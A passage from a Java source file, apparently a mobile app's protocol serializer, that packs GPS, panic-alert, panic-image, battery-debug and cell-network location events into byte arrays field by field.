			//Length of Payload_Size 2 Bytes.
			String payloadSize = event.getPayloadSize();
			ProtocolParserUtil.writeString2Bytes(payloadSize, bos);
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(GpsBatteryLifeDebugEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			//Debug_Mode 2 Bytes.
			short mode = (short)event.getMode().getId();
			bos.write(ByteUtil.toByte(mode));
			//Field_Count 1 Byte.
			byte fieldCount = (byte)event.getFieldCount();
			bos.write(ByteUtil.toByte(fieldCount));
			//Length of Battery_Before 2 Bytes.
			String batteryBefore = event.getBatteryBefore();
			ProtocolParserUtil.writeString2Bytes(batteryBefore, bos);
			//Length of Battery_After 2 Bytes.
			String batteryAfter = event.getBatteryAfter();
			ProtocolParserUtil.writeString2Bytes(batteryAfter, bos);
			//Length of Start_Time 2 Bytes.
			String startTime = event.getStartTime();
			if (startTime == null) {
				startTime = "0000-00-00 00:00:00";
			}
			ProtocolParserUtil.writeString2Bytes(startTime, bos);
			//Length of  End_Time 2 Bytes.
			String endTime = event.getEndTime();
			if (endTime == null) {
				endTime = "0000-00-00 00:00:00";
			}
			ProtocolParserUtil.writeString2Bytes(endTime, bos);
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(PanicGPSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			// Latitude 8 Bytes. (Decimal)
			double latitude = event.getLatitude();
			bos.write(ByteUtil.toByte(latitude));
			// Longitude 8 Bytes. (Decimal)
			double longitude = event.getLongitude();
			bos.write(ByteUtil.toByte(longitude));
			// Altitude 4 Bytes. 
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			// Coordinate Accuracy 1 Byte.
			byte coordinate = (byte) event.getCoordinateAccuracy().getId();
			bos.write(ByteUtil.toByte(coordinate));
			String networkName = event.getNetworkName();
			ProtocolParserUtil.writeString1Byte(networkName, bos);
			String networkId = event.getNetworkId();
			ProtocolParserUtil.writeString1Byte(networkId, bos);
			String cellName = event.getCellName();
			ProtocolParserUtil.writeString1Byte(cellName, bos);
			// Cell Id 4 Bytes.
			int cellId = (int) event.getCellId();
			bos.write(ByteUtil.toByte(cellId));
			// Country Code 4 Bytes.
			int countryCode = (int) event.getCountryCode();
			bos.write(ByteUtil.toByte(countryCode));
			// Area Code 4 Bytes.
			int areaCode = (int) event.getAreaCode();
			bos.write(ByteUtil.toByte(areaCode));
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(PanicStatusEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			// Panic Status 1 Byte.
			byte status = (byte) event.getStatus().getId();	
			bos.write(ByteUtil.toByte(status));
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(AlertGPSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			// Latitude 8 Bytes. (Decimal)
			double latitude = event.getLatitude();
			bos.write(ByteUtil.toByte(latitude));
			// Longitude 8 Bytes. (Decimal)
			double longitude = event.getLongitude();
			bos.write(ByteUtil.toByte(longitude));
			// Altitude 4 Bytes. 
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			// Coordinate Accuracy 1 Byte.
			byte coordinate = (byte) event.getCoordinateAccuracy().getId();
			bos.write(ByteUtil.toByte(coordinate));
			String networkName = event.getNetworkName();
			ProtocolParserUtil.writeString1Byte(networkName, bos);
			String networkId = event.getNetworkId();
			ProtocolParserUtil.writeString1Byte(networkId, bos);
			String cellName = event.getCellName();
			ProtocolParserUtil.writeString1Byte(cellName, bos);
			// Cell Id 4 Bytes.
			int cellId = (int) event.getCellId();
			bos.write(ByteUtil.toByte(cellId));
			// Country Code 4 Bytes.
			int countryCode = (int) event.getCountryCode();
			bos.write(ByteUtil.toByte(countryCode));
			// Area Code 4 Bytes.
			int areaCode = (int) event.getAreaCode();
			bos.write(ByteUtil.toByte(areaCode));
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(PanicImageEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			// Latitude 8 Bytes. (Decimal)
			double latitude = event.getLatitude();
			bos.write(ByteUtil.toByte(latitude));
			// Longitude 8 Bytes. (Decimal)
			double longitude = event.getLongitude();
			bos.write(ByteUtil.toByte(longitude));
			// Altitude 4 Bytes. 
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			// Coordinate Accuracy 1 Byte.
			byte coordinate = (byte) event.getCoordinateAccuracy().getId();
			bos.write(ByteUtil.toByte(coordinate));
			String networkName = event.getNetworkName();
			ProtocolParserUtil.writeString1Byte(networkName, bos);
			String networkId = event.getNetworkId();
			ProtocolParserUtil.writeString1Byte(networkId, bos);
			String cellName = event.getCellName();
			ProtocolParserUtil.writeString1Byte(cellName, bos);
			// Cell Id 4 Bytes.
			int cellId = (int) event.getCellId();
			bos.write(ByteUtil.toByte(cellId));
			// Country Code 4 Bytes.
			int countryCode = (int) event.getCountryCode();
			bos.write(ByteUtil.toByte(countryCode));
			// Area Code 4 Bytes.
			int areaCode = (int) event.getAreaCode();
			bos.write(ByteUtil.toByte(areaCode));
			// Media Type 1 Byte.
			byte mediaType = (byte) event.getMediaType().getId();
			bos.write(ByteUtil.toByte(mediaType));
			String imagePath = event.getImagePath();
			if (imagePath != null) {
				int size = (int) FileUtil.getFileSize(imagePath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(imagePath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int) 0));
			}
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(LocationEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try{
			parseEventHeader(event, bos);
			// parse calling module (1 byte)
			byte callingModule = (byte) event.getCallingModule().getId();
			bos.write(ByteUtil.toByte(callingModule));
			// parse method (1 byte)
			byte method = (byte) event.getMethod();
			bos.write(ByteUtil.toByte(method));
			// parse provider (1 byte)
			bos.write(ByteUtil.toByte((byte) event.getProvider()));
			// parse longitude (8 bytes)
			bos.write(ByteUtil.toByte(event.getLongitude()));
			// parse latitude (8 bytes)
			bos.write(ByteUtil.toByte(event.getLatitude()));
			// parse altitude (4 bytes)
			bos.write(ByteUtil.toByte((float) event.getAltitude()));
			// parse speed (4 bytes)
			bos.write(ByteUtil.toByte((float) event.getSpeed()));
			//  parse heading (4 bytes)
			bos.write(ByteUtil.toByte((float) event.getHeading()));
			// parse horizontal accuracy (4 bytes)
			bos.write(ByteUtil.toByte((float) event.getHorizontalAccuracy()));
			// parse vertical accuracy (4 bytes)
			bos.write(ByteUtil.toByte((float) event.getVerticalAccuracy()));
			
			// Cell info
			// parse network name (string) and length (1 byte)
			ProtocolParserUtil.writeString1Byte(event.getNetworkName(), bos);
			// parse network id (String) and length (1 byte)
			ProtocolParserUtil.writeString1Byte(event.getNetworkId(), bos);
			// parse cell name (String) and length (1 byte)
			ProtocolParserUtil.writeString1Byte(event.getCellName(), bos);
			// parse cell ID (4 bytes)
			bos.write(ByteUtil.toByte((int) event.getCellId()));
			// parse mobile country code (String) and length (1 byte)
			ProtocolParserUtil.writeString1Byte(event.getMobileCountryCode(), bos);
			// parse area code (4 bytes) 
			bos.write(ByteUtil.toByte((int) event.getAreaCode()));			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
}
